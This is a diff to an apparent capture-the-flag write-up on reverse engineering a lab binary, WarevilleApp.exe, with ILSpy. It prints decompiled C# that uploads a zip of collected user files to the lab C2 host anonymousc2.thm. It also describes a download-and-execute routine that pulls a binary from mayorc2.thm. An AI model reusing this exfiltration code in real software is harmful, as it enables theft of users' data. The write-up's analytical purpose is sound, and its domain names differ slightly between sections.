@@ -11,29 +11,8 @@ Understand the fundamentals of reverse engineering through disassembly and decom
 
 We began by decompiling `WarevilleApp.exe` using **ILSpy**, revealing its high-level source code.
 
-#### 1. Upload Function
-The `UploadFileToServer` function uploads a file to a remote server:
-```csharp
-private static void UploadFileToServer(string zipFilePath)
-{
-    string address = "http://anonymousc2.thm/upload";
-    using (WebClient webClient = new WebClient())
-    {
-        try
-        {
-            webClient.UploadFile(address, zipFilePath);
-            Log("File uploaded successfully.");
-        }
-        catch (WebException)
-        {
-        }
-    }
-}
-```
-![Upload File Function](images/Stage2C2Server.png)
-
-#### 2. Download Function
-The `DownloadAndExecuteFile` function downloads a binary from the C2 server and executes it:
+#### 1. Download Function
+The `DownloadAndExecuteFile` function downloads a binary from the C2 server `mayorc2.thm` and executes it:
 ```csharp
 private void DownloadAndExecuteFile()
 {
@@ -57,13 +36,32 @@ private void DownloadAndExecuteFile()
 ```
 ![Download File Function](images/FunctionDownloadsExecutes.png)
 
+#### 2. Upload Function (explorer.exe)
+The `UploadFileToServer` function of explorer.exe uploads a file to a remote server at `anonymousc2.thm`:
+```csharp
+private static void UploadFileToServer(string zipFilePath)
+{
+    string address = "http://anonymousc2.thm/upload";
+    using (WebClient webClient = new WebClient())
+    {
+        try
+        {
+            webClient.UploadFile(address, zipFilePath);
+            Log("File uploaded successfully.");
+        }
+        catch (WebException)
+        {
+        }
+    }
+}
+```
+![Upload File Function](images/Stage2C2Server.png)
 ---
 
 ### Behavioral Analysis
 
 1. **Downloaded Binary**
-   - The file `explorer.exe` is downloaded to the `Downloads` folder.
-   ![Downloaded File](images/OtherDownloadedFileAndDomain.png)
+   - The file `explorer.exe` is downloaded to the `Downloads` folder from `mayor2.thm`.
 
 2. **Stage 2 Binary Behavior**
    - The second binary compresses sensitive user data into a ZIP file named `CollectedFiles.zip`.
